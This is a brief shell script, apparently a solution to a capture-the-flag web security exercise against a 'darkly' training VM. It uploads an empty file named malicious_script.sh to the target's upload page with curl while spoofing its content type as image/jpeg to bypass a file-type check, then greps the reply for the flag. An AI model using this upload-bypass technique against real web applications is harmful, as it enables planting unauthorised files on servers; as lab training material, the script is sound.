if [ -z $1 ]
then
	echo "Usage: ./run.sh [darkly_vm_ip]"
else
	touch /tmp/malicious_script.sh
	curl -s -X POST \
        -F "uploaded=@/tmp/malicious_script.sh;type=image/jpeg" \
        -F "Upload=Upload" "$1/index.php?page=upload" \
        | grep 'flag'
fi
